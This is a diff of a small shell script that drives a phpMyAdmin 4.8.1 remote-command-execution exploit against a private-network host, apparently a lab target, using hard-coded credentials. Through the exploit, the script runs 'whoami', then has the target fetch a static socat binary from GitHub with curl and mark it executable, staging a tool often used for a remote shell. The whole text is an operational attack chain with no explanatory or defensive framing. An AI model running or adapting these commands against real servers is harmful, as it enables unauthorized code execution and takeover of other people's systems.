@@ -1,5 +1,5 @@
+#!/bin/sh
 python3 phpmyadmin481-exec.py 10.0.2.15 8080 /index.php devsecops devsecops whoami
-
 python3 phpmyadmin481-exec.py 10.0.2.15 8080 /index.php devsecops devsecops "curl -L -O https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
 python3 phpmyadmin481-exec.py 10.0.2.15 8080 /index.php devsecops devsecops "chmod +x socat"
 
